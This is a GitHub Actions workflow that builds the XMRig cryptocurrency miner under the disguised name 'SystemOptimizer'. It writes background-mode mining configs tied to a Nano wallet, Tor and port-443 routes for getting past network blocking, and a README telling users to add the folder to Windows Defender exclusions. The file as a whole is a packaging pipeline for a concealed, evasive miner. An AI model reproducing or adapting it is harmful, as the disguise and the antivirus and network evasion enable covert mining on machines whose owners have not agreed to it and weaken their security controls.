name: Build Custom XMRig for Windows

on:
  push:
    branches: [ master, main ]
  pull_request:
    branches: [ master, main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-2022
    
    steps:
    - name: Checkout code
      uses: actions/checkout@v4
      
    - name: Setup MSVC
      uses: ilammy/msvc-dev-cmd@v1
      with:
        arch: x64
    
    - name: Cache vcpkg
      uses: actions/cache@v3
      with:
        path: |
          C:\vcpkg\installed
          C:\vcpkg\packages
        key: ${{ runner.os }}-vcpkg-${{ hashFiles('**/vcpkg.json') }}
        restore-keys: |
          ${{ runner.os }}-vcpkg-
        
    - name: Install dependencies with vcpkg
      run: |
        cd C:\vcpkg
        .\vcpkg integrate install
        .\vcpkg install libuv:x64-windows-static openssl:x64-windows-static
      shell: cmd
      
    - name: Customize project name
      run: |
        (Get-Content CMakeLists.txt) -replace 'project\(xmrig\)', 'project(SystemOptimizer)' | Set-Content CMakeLists.txt
      shell: pwsh
      
    - name: Create custom FindUV.cmake
      run: |
        $findUVContent = @"
        # Custom FindUV for vcpkg
        set(UV_ROOT "C:/vcpkg/installed/x64-windows-static")
        
        find_path(UV_INCLUDE_DIR
          NAMES uv.h
          PATHS `${UV_ROOT}/include
          NO_DEFAULT_PATH
        )
        
        find_library(UV_LIBRARY
          NAMES uv_a uv libuv
          PATHS `${UV_ROOT}/lib
          NO_DEFAULT_PATH
        )
        
        include(FindPackageHandleStandardArgs)
        find_package_handle_standard_args(UV DEFAULT_MSG UV_LIBRARY UV_INCLUDE_DIR)
        
        if(UV_FOUND)
          set(UV_LIBRARIES `${UV_LIBRARY})
          set(UV_INCLUDE_DIRS `${UV_INCLUDE_DIR})
        endif()
        
        mark_as_advanced(UV_INCLUDE_DIR UV_LIBRARY)
        "@
        
        $findUVContent | Out-File -FilePath "cmake/FindUV.cmake" -Encoding UTF8
      shell: pwsh
      
    - name: Configure CMake
      run: |
        mkdir build
        cd build
        cmake .. -G "Visual Studio 17 2022" -A x64 ^
          -DCMAKE_BUILD_TYPE=Release ^
          -DCMAKE_TOOLCHAIN_FILE=C:/vcpkg/scripts/buildsystems/vcpkg.cmake ^
          -DVCPKG_TARGET_TRIPLET=x64-windows-static ^
          -DUV_ROOT=C:/vcpkg/installed/x64-windows-static ^
          -DOPENSSL_ROOT_DIR=C:/vcpkg/installed/x64-windows-static ^
          -DWITH_HWLOC=OFF ^
          -DWITH_HTTP=ON ^
          -DWITH_TLS=ON ^
          -DBUILD_STATIC=ON
      shell: cmd
      
    - name: Build
      run: |
        cd build
        cmake --build . --config Release --parallel
      shell: cmd
      
    - name: Prepare artifacts
      run: |
        mkdir output
        Copy-Item "build\Release\SystemOptimizer.exe" "output\"
        
        # Create config with Tor SOCKS5 proxy
        @"
        {
            "autosave": true,
            "background": true,
            "colors": false,
            "title": false,
            "randomx": {
                "init": -1,
                "mode": "auto",
                "1gb-pages": false,
                "numa": true
            },
            "cpu": {
                "enabled": true,
                "huge-pages": true,
                "priority": 1,
                "max-threads-hint": 75,
                "asm": true
            },
            "log-file": "optimizer.log",
            "pools": [
                {
                    "url": "rx.unmineable.com:3333",
                    "user": "NANO:nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp.d3ibis_pc#c5g6-wmzx",
                    "pass": "x",
                    "keepalive": true,
                    "tls": false,
                    "socks5": "127.0.0.1:9050"
                }
            ],
            "print-time": 60,
            "retries": 5,
            "retry-pause": 5
        }
        "@ | Out-File -FilePath "output\config-tor.json" -Encoding UTF8
        
        # Create config with TLS
        @"
        {
            "autosave": true,
            "background": true,
            "colors": false,
            "title": false,
            "randomx": {
                "init": -1,
                "mode": "auto",
                "1gb-pages": false,
                "numa": true
            },
            "cpu": {
                "enabled": true,
                "huge-pages": true,
                "priority": 1,
                "max-threads-hint": 75,
                "asm": true
            },
            "log-file": "optimizer.log",
            "pools": [
                {
                    "url": "rx.unmineable.com:443",
                    "user": "NANO:nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp.d3ibis_pc#c5g6-wmzx",
                    "pass": "x",
                    "keepalive": true,
                    "tls": true
                }
            ],
            "print-time": 60,
            "retries": 5,
            "retry-pause": 5
        }
        "@ | Out-File -FilePath "output\config-tls.json" -Encoding UTF8
        
        # Create config for direct testing
        @"
        {
            "autosave": true,
            "background": false,
            "colors": true,
            "title": true,
            "randomx": {
                "init": -1,
                "mode": "auto",
                "1gb-pages": false,
                "numa": true
            },
            "cpu": {
                "enabled": true,
                "huge-pages": true,
                "priority": 1,
                "max-threads-hint": 75,
                "asm": true
            },
            "log-file": null,
            "pools": [
                {
                    "url": "rx.unmineable.com:3333",
                    "user": "NANO:nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp.d3ibis_pc#c5g6-wmzx",
                    "pass": "x",
                    "keepalive": true,
                    "tls": false
                }
            ],
            "print-time": 60,
            "retries": 5,
            "retry-pause": 5
        }
        "@ | Out-File -FilePath "output\config-direct.json" -Encoding UTF8
        
        # Batch files
        @"
        @echo off
        echo Starting System Optimizer with Tor Proxy...
        echo Make sure Tor is running on port 9050!
        echo.
        SystemOptimizer.exe -c config-tor.json -B
        "@ | Out-File -FilePath "output\start-with-tor.bat" -Encoding ASCII
        
        @"
        @echo off
        echo Testing System Optimizer...
        echo This shows the console. Press Ctrl+C to stop.
        echo.
        SystemOptimizer.exe -c config-direct.json
        "@ | Out-File -FilePath "output\start-test.bat" -Encoding ASCII
        
        @"
        @echo off
        echo Starting System Optimizer with TLS...
        echo.
        SystemOptimizer.exe -c config-tls.json -B
        "@ | Out-File -FilePath "output\start-with-tls.bat" -Encoding ASCII
        
        # README
        @"
        # Nano Mining with SystemOptimizer

        Wallet: nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp
        Referral: c5g6-wmzx (0.25% discount)

        ## Quick Start

        1. TEST FIRST: Double-click start-test.bat
           - If it connects, great!
           - If blocked, proceed to step 2

        2. BYPASS BLOCKING:
           
           Option A - With Tor:
           - Download: https://www.torproject.org/download/tor/
           - Extract and run tor.exe
           - Double-click: start-with-tor.bat

           Option B - With TLS:
           - Double-click: start-with-tls.bat
           - Uses port 443 (like HTTPS)

        ## Windows Defender

        Add this folder to exclusions or it will delete the file!
        Settings → Windows Security → Exclusions → Add folder

        ## Monitor Stats

        https://unmineable.com/
        Enter your Nano address to see earnings

        ## Troubleshooting

        - Connection refused: Use start-with-tls.bat or start-with-tor.bat
        - File deleted: Add to Windows Defender exclusions
        - Low hashrate: Run as Administrator, close other programs

        Build: $(Get-Date -Format "yyyy-MM-dd HH:mm")
        "@ | Out-File -FilePath "output\README.txt" -Encoding UTF8
      shell: pwsh
      
    - name: Upload artifacts
      uses: actions/upload-artifact@v4
      with:
        name: SystemOptimizer-Nano-Windows
        path: output/
        retention-days: 90
